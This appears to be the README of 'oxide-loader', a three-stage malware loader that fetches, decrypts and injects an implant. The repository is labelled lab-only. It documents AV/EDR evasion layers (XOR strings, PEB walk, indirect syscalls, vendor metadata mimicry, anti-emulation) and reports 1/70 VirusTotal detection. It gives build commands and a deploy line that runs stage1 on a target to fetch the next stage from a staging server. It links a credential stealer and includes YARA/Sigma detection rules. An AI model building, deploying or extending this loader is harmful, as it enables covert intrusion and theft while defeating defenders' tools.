# oxide-loader

3-stage payload delivery chain for the oxide security research framework.

**Lab use only. Default C2 is localhost. See `DISCLAIMER.md`.**

---

## Stages

| Stage | Language | Role |
|-------|----------|------|
| stage1 | C, freestanding | Fetches stage2 over HTTP. Hardened to **1/70 VT same-day** (2026-05-07). 11.3 KB unsigned, 13.7 KB signed. |
| stage2 | Rust | Anti-analysis checks, fetches stage3. |
| stage3 | Rust | Decrypts embedded implant, injects or executes. |

## Stage1 hardening (v1.0-preview)

| Session | Layer | File(s) |
|---------|-------|---------|
| S33 | Compile-time string XOR + PEB walk + djb2 API resolution | `stage1/src/{xor_string,peb_walk,api_table,hash}.{c,h}` |
| S34 | Hell's Hall indirect syscalls + Realtek HD Audio Manager VERSIONINFO mimicry + lab CA self-sign | `stage1/src/syscalls.c`, `stage1/resources/`, `stage1/sign.sh` |
| S35 | Per-build XS XOR seed plumbing for polymorphic packer | `stage1/src/xs_seed.h.example`, `Makefile` |
| S39 | Decoy IAT shaping (12 kernel32 entries, three tiers) | `stage1/src/decoys.{c,h}` |
| S40 | QPC/Sleep + CPU-loop anti-emulation guards | `stage1/src/anti_emu.{c,h}` |

VT measurement record: see [oxide/docs/vt-scans/v1.0-stage1-S40-seed4242.md](https://github.com/diemoeve/oxide/blob/main/docs/vt-scans/v1.0-stage1-S40-seed4242.md). Single hit: Rising RDML (Chinese AV ML, generic Kryptik label). Microsoft Defender, Bitdefender cluster, SentinelOne static AI, CrowdStrike Falcon, Kaspersky, ESET, Sophos, Symantec: undetected.

Static-cleanliness contract and per-feature documentation: `stage1/README.md`.

## Build

```bash
cd stage1 && make
cd stage2 && cargo build --release
python3 builder.py \
  --implant ../oxide/target/release/oxide-implant \
  --psk oxide-lab-psk \
  --salt $(cat ../oxide/certs/salt.hex) \
  --out-rs stage3/src/payload.rs --rebuild
```

## Deploy

Upload binaries to the oxide panel staging endpoint, then run stage1 on the target:

```bash
STAGE_URL=http://10.10.100.1:8080 ./stage1/build/stage1
```

## builder.py

Encrypts the implant with AES-256-GCM (PBKDF2-derived key) and generates
`stage3/src/payload.rs` for compile-time embedding.

```bash
python3 builder.py --help
```

## Detection

```
detection/
├── yara/
│   ├── stage1_magic.yar              # legacy magic byte
│   ├── stage1_xor.yar                # legacy XOR loop
│   ├── stage1_imports.yar            # legacy IAT
│   ├── stage1_peb_walk.yar           # S33 PEB walk + djb2 (T1027.007)
│   ├── stage1_decoy_iat_shape.yar    # S39 IAT silhouette (T1027.007, T1480)
│   ├── stage1_hellshall_ssn_resolve.yar  # S34 Hell's Hall (T1106, T1027.007)
│   ├── stage1_versioninfo_mimicry.yar    # S34 OEM mimicry (T1036.005)
│   └── stage1_qpc_sleep_divergence_check.yar  # S40 timing probe (T1497.003, T1480)
└── sigma/
    ├── stage1_network.yml                # legacy network
    ├── stage1_minimal_iat.yml            # S39 IAT shape (rewritten)
    ├── stage1_cert_cn_mimicry.yml        # S34 cert subject mimicry (T1036.001)
    └── stage1_long_sleep_pre_network.yml # S40 quiet startup (T1497.003, T1480)
```

ATT&CK: T1027.007, T1036.001, T1036.005, T1055, T1071.001, T1105, T1106, T1480, T1497, T1497.003.

---

## Related

- [oxide](https://github.com/diemoeve/oxide) - Implant + C2 panel
- [oxide-stealer](https://github.com/diemoeve/oxide-stealer) - Browser credential extraction
- [oxide-infra](https://github.com/diemoeve/oxide-infra) - Lab infrastructure (Terraform + Ansible)
